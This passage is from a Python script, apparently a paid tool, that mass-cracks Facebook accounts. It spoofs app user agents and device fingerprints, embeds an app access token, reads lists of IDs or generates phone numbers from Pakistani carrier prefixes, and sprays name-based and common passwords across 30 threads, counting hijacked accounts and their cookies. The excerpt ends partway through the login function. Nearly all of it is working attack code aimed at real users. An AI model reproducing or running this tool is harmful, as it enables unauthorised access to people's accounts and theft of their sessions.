Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.43 Agency/98.8.5907.8","Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SQ1A.220105.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; T500 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 42LB5800-UG; 04.03.10; 0x00000001;); LG NetCast.TV-2013 /04.03.10 (LG, 42LB5800-UG, wired)","Mozilla/5.0 (Linux; Android 10; NOTE 20 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; U705AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168","Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A325F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/350.1.0.29.106;]","Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]","Mozilla/5.0 (Linux; Android 9; SM-T595 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Safari/537.36 [FB_IAB/FB4A;FBAV/261.0.0.52.126;]","Mozilla/5.0 (Linux; arm_64; Android 8.0.0; BAH2-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.116 YaBrowser/22.1.2.119.01 Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 11; 21061119DG Build/RP1A.200720.011) com.gr.bkfonbet/6.25-fgr-i-r-p Chat/3.3.2","Dalvik/2.1.0 (Linux; U; Android 11; SM-X205 Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-7)","Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/346.0.0.27.116;FBBV/348162750;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]","Mozilla/5.0 (Linux; Android 9; X19 S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH1969 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CPH2139 Build/QKQ1.200614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; CPH1901 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.1; SM-C710F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; 6501 Build/Q00711; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; vivo 1714 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi S2 Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A013G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","sonoroMUSIC/4.6.61.0 CFNetwork/1121.2.2 Darwin/19.3.0","Mozilla/5.0 (Linux; Android 8.1.0; A60 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]",])+END
    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 9; GEEKTV PRO Build/PPR1.181005.003)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-23)","Dalvik/2.1.0 (Linux; U; Android 13; SO-54C Build/64.1.C.0.131)","Dalvik/2.1.0 (Linux; U; Android 13; V2246 Build/TP1A.220624.014_INMOD1) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; jacuzzi Build/R114-15437.61.0)","Dalvik/2.1.0 (Linux; U; Android 9; S61 Build/PKQ1.190118.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A035G Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; moto g42 Build/S2SES32.28-70-11) VD/238","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900F Build/MMB29M) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; KYT32 Build/1.010SI.30.a)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-C5018 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-13-2-3-2)","Dalvik/2.1.0 (Linux; U; Android 13; 23053RN02A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; Onn 2k TV stick Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230705.001.A1)","Dalvik/2.1.0 (Linux; U; Android 13; T811 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Pro Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2027 Build/SP1A.210812.003) VD/235","Dalvik/2.1.0 (Linux; U; Android 8.0.0; LG-H930 Build/OPR1.170623.026) AppleWebKit [PB/113]","Dalvik/2.1.0 (Linux; U; Android 13.0; moto g 5G (2022) Build/T1SAS33.73-40-3)","Dalvik/2.1.0 (Linux; U; Android 13; 21061119AG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; Surface Duo Build/2022.831.13)","Dalvik/2.1.0 (Linux; U; Android 12; M40 Plus_ROW Build/M40Plus_ROW)","Dalvik/2.1.0 (Linux; U; Android 10; 1016TPC Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 9; Pixel 3 Build/PQ1A.181205.006)","Dalvik/2.1.0 (Linux; U; Android 11; Box R 4K Plus Build/RTT0.211009.001)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 7 WiFi Build/SQ1D.211205.016.A5)","Dalvik/2.1.0 (Linux; U; Android 11; KFSNWI Build/RS8319.1664N)","Dalvik/2.1.0 (Linux; U; Android 13; SM-E045F Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; 22101316G Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; CPH2091 Build/QKQ1.200216.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; SM-P613 Build/SP2A.220305.013) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; DN2103 Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; 2201117TY Build/RKQ1.211001.001) AppleWebKit [PB/113]","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Build/UPB4.230623.005)","Dalvik/2.1.0 (Linux; U; Android 10; Pixel Build/QQ3A.200805.001) CWAndroidSDK","Dalvik/2.1.0 (Linux; U; Android 11; Doro 8100 Build/S10A_703)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2419 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 10; A12 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; WayDroid x86_64 Device Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 12; VNE-N41 Build/HONORVNE-N41)","Dalvik/2.1.0 (Linux; U; Android 7.0; G3311 Build/43.0.A.5.79)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS-TVE21A2 Build/PTO8.220620.001)","Dalvik/2.1.0 (Linux; U; Android 11; nami Build/R114-15437.57.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-M136B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; MT06 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; K7 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-37)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A525F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 11; TFY-LX1 Build/HONORTFY-L31CQ) AppleWebKit [PB/113]","Dalvik/2.1.0 (Linux; U; Android 12; 220733SG Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; 2201117TG Build/TKQ1.221114.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 12; Hammer_IRON_4 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Chromecast Build/STTE.230319.008.H1)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2531 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-DC54 Build/68.0.A.0.797)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia C32 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0; 5095K Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 neo Build/T1SSM33.1-121-4)","Dalvik/2.1.0 (Linux; U; Android 9; VEGA FHD Android TV Build/PTO2.210830.001)","Dalvik/2.1.0 (Linux; U; Android 12; FIVE Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 12; SM-G991B Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 12; SM-G950F Build/SQ3A.220705.004)","Dalvik/2.1.0 (Linux; U; Android 9; ANE-LX1 Build/HUAWEIANE-L01) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; moto g 5G (2022) Build/T1SAS33.73-40-3) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; ZTE Blade A51 Build/RP1A.201005.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; S24 Build/QP1A.190711.020) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; SM-J600FN Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.929) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook 15  (CB515-1H, CB515-1HT)Build/R114-15437.61.0)","Dalvik/2.1.0 (Linux; U; Android 9; LM-Q510N Build/PKQ1.190522.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; rk3326_mid Build/OPM6.171019.030.B1)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2493 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; XP8800 Build/8A.0.6-13-8.1.0-10.92.00)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo K13 Build/QOJ30.506-21)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A146W Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; AiPlus2K Build/PTO2.220518.001)","Dalvik/2.1.0 (Linux; U; Android 12; T40S_EEA Build/M40Plus_EEA)","Dalvik/2.1.0 (Linux; U; Android 13; Lenovo TB128FU Build/TKQ1.221220.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SN32.34-72-31)","Dalvik/2.1.0 (Linux; U; Android 10; PLAY NOW TV BOX 3 Build/QT)","Dalvik/2.1.0 (Linux; U; Android 11; 220333QNY Build/RKQ1.211001.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-G980F Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 10; M2006C3LVG MIUI/V12.0.18.0.QCDEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3MII Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; 8082 Build/O11019) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; XPL 3000 Build/V002S901_20181121)","Dalvik/2.1.0 (Linux; U; Android 12; SN304AE Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH22 Build/QTG3.200305.006.S312)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G Build/RPNS31.Q1-51-40-16-29)","Dalvik/2.1.0 (Linux; U; Android 10; ART-AL00x Build/HUAWEIART-AL00x)","Dalvik/2.1.0 (Linux; U; Android 12; QUAD-CORE A133 b3 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; motorola razr 40 ultra Build/T1TZ33.3-62-39)","Dalvik/2.1.0 (Linux; U; Android 11; Grundig Android UHD TV Build/RTM6.230109.085)","Dalvik/2.1.0 (Linux; U; Android 11; A60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; LongTV_GN7501E Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G960U Build/MMB29K)",])+END
    return ua

ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
      
ua = "[FBAN/FB4A;FBAV/362.0.0.39.122;FBBV/103340811;[FBAN/FB4A;FBAV/362.0.0.39.122;FBPN/com.facebook.katana;FBLC/en_US;FBBV/103340811;FBCR/Airtel;FBMF/;FBBD/Infinix;FBDV/Infinix X688B;FBSV/7.1.3;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,height=,width=;FB_FW/1;]"
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
#________________________________________#

logo=(f"""
     _    ____ ___ _____ 
    / \  / ___|_ _|  ___|
   / _ \ \___ \| || |_   
  / ___ \ ___) | ||  _|  
 /_/   \_\____/___|_|                            
{GREEN}_______________________________________________________                         
\033[1;93m[•] OWNER.   : ASIF SAKHANI 
\033[1;35m[•] FACEBOOK : MR DEVIL 
\033[1;92m[•] TOOL     : RANDOM & FILE
\033[1;91m[•] WHATSAPP : 03417020930
\033[1;96m[•] VERSION  : 2.0
\033[1;39m[•] STATUS   : Paid
{RED}================================================

{GREEN}=================================================""")

def linex():
	print(f'\033[1;37m------------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu():
        try:
                clear()
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print('[1] FILE CLONING ')
                        print('[2] RANDOM CLONING')
                        print('[3] EXIT')
                        linex()
                        xd=input(' CHOOSE AN OPTION: ')
                        #os.system('xdg-open ')
                        if xd in ['1','01']:
                                clear()
                                
                                print(' PUT FILE EXAMPLE :  /sdcard/File.trt.etc..')
                                linex()
                                file = input(' PUT FILE PATH\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('[1] METHOD (1)')
                                print('[2] METHOD (2)')
                                linex()
                                mthd=input(' CHOOSE : ')
                                linex()
                                clear()
                                plist = []
                                try:
                                        ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                                except:
                                        ps_limit =1
                                linex()
                                clear()
                                print('\033[1;32m EXAMPLE : first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' PUT PASSWORD {i+1}: '))
                                linex()
                                clear()
                                print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
                                linex()
                                cx=input(' CHOOSE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        
                                        print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
                                        print("\033[1;37m CRACKING STARTED...\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' THE PROCESS HAS COMPLETED')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' PRESS ENTER TO BACK ')
                                os.system('python trt.py')
                        elif xd in ['2','02']:
                                pak()
                        elif xd in ['3','03']:
                                exit()
                        
        except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;32m CODE EXAMPLE : 0306,0315,0335,0345')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;32m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TRT:     
                        clear()
                        
                        tl = str(len(user))
                        print(' TOTAL ACCOUNT : \033[1;32m'+tl)
                        print(f'\033[1;37m CHOICE CODE ..:\033[1;32m '+code)
                        print(f'\033[1;37m CRACKING STARTED...\033[1;37m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12','khan123','khan786','pakistan','pubg123','malik123','Ahmad123','karachi123','pikhawar']
                                TRT.submit(uidm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python trt.py')
#------
import random

def generate_random_user_agent():
    # List of common device manufacturers and models
    device_info = [
        ('Samsung', 'Galaxy S21'),
        ('Apple', 'iPhone 13'),
        ('Xiaomi', 'Redmi Note 10'),
        ('Google', 'Pixel 5'),
        ('OnePlus', 'OnePlus 9'),
        ('Huawei', 'Mate 30'),
        ('Sony', 'Xperia 1 II'),
        ('LG', 'G8 ThinQ'),
        ('Nokia', 'Nokia 8.3'),
        ('Motorola', 'Moto G Power')
    ]

    # Randomly select device manufacturer and model
    device_manufacturer, device_model = random.choice(device_info)

    # Random Android version (major and minor)
    android_major_version = random.randint(5, 12)
    android_minor_version = random.randint(0, 9)
    android_version = f'{android_major_version}.{android_minor_version}'

    # Random Facebook app version
    fb_app_version = f'{random.randint(200, 300)}.0.0.{random.randint(1, 100)}'

    # Random density, width, and height
    density = round(random.uniform(1.5, 3.5), 2)
    width = random.randint(720, 2560)
    height = random.randint(1280, 5120)

    # Random language (5 random lowercase letters)
    language = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))

    # Random carrier code (5 random uppercase letters)
    carrier_code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=5))

    # Random CPU architecture
    cpu_architectures = ['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64']
    cpu_architecture = random.choice(cpu_architectures)

    # Construct the user agent string
    user_agent = (f'[FBAN/FB4A;FBAV/{fb_app_version};FBBV/{random.randint(200000000, 300000000)};'
                  f'FBDM/{{density={density},width={width},height={height}}};FBLC/{language};'
                  f'FBRV/{random.randint(200000000, 300000000)};FBCR/{carrier_code};'
                  f'FBMF/{device_manufacturer};FBBD/{device_model};FBPN/com.facebook.katana;'
                  f'FBDV/{device_model};FBSV/{android_version};FBOP/1;FBCA/{cpu_architecture};]')

    return user_agent

if __name__ == "__main__":
    random_user_agent = generate_random_user_agent()
    print(random_user_agent)
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ASIF SAKHANI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/362.0.0.39.122;FBBV/103340811;[FBAN/FB4A;FBAV/362.0.0.39.122;FBPN/com.facebook.katana;FBLC/en_US;FBBV/103340811;FBCR/Airtel;FBMF/;FBBD/Infinix;FBDV/Infinix X688B;FBSV/7.1.3;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,height=,width=;FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
